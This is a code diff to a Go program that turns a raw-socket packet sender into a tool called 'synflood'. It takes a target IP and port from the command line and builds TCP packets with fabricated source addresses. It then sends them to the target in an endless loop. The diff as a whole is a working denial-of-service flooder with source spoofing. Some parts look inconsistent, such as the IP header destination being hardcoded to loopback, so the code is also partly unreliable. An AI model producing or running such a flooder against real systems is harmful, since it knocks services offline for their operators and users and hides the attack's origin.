@@ -4,23 +4,35 @@ import (
 	"log"
 	"math/rand"
 	"net"
+	"os"
 	"strconv"
 	"strings"
 	"syscall"
 )
 
+var random int = 0
+
 func main() {
 	var err error
 	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 	var random_port int = 0
-	p := pkt()
+	if len(os.Args) < 3 {
+		usage()
+		os.Exit(0)
+	}
+	dst_ip := os.Args[1]
+	port, err := strconv.ParseUint(os.Args[2], 10, 16)
+	if err != nil {
+		log.Fatal("Wrong port")
+	}
 	for {
+		p := pkt(dst_ip, uint16(port))
 		if random_port > 65000 {
 			random_port = 0
 		}
 		addr := syscall.SockaddrInet4{
 			Port: random_port,
-			Addr: [4]byte{127, 0, 0, 1},
+			Addr: to4byte(dst_ip),
 		}
 		err = syscall.Sendto(fd, p, 0, &addr)
 		random_port++
@@ -30,12 +42,29 @@ func main() {
 	}
 }
 
-func pkt() []byte {
-	laddr := "127.0.0.1"
-	raddr := "192.168.33.10"
+func usage() {
+	log.Printf("usage: synflood <Destination Ip> <Port>")
+}
+
+func gen_random_ip() string {
+	if random > 252 {
+		random = 0
+	}
+
+	b1 := strconv.Itoa(random)
+	b2 := strconv.Itoa(random + 1)
+	b3 := strconv.Itoa(random + 2)
+	b4 := strconv.Itoa(random + 3)
+	ip := b1 + "." + b2 + "." + b3 + "." + b4
+	return ip
+}
+
+func pkt(dst_ip string, port uint16) []byte {
+	laddr := gen_random_ip()
+	raddr := dst_ip
 	packet := TCPHeader{
 		Source:      0xaa47, // Random ephemeral port
-		Destination: 80,
+		Destination: port,
 		SeqNum:      rand.Uint32(),
 		AckNum:      0,
 		DataOffset:  5,      // 4 bits
@@ -51,10 +80,10 @@ func pkt() []byte {
 	h := Header{
 		Version:  4,
 		Len:      20,
-		TotalLen: 20, // 20 bytes for IP, 10 for ICMP
+		TotalLen: 20, // 20 bytes for IP + tcp
 		TTL:      64,
-		Protocol: 1, // ICMP
-		Dst:      net.IPv4(192, 168, 33, 10),
+		Protocol: 6, // TCP
+		Dst:      net.IPv4(127, 0, 0, 1),
 		// ID, Src and Checksum will be set for us by the kernel
 	}
 	data := packet.Marshal()
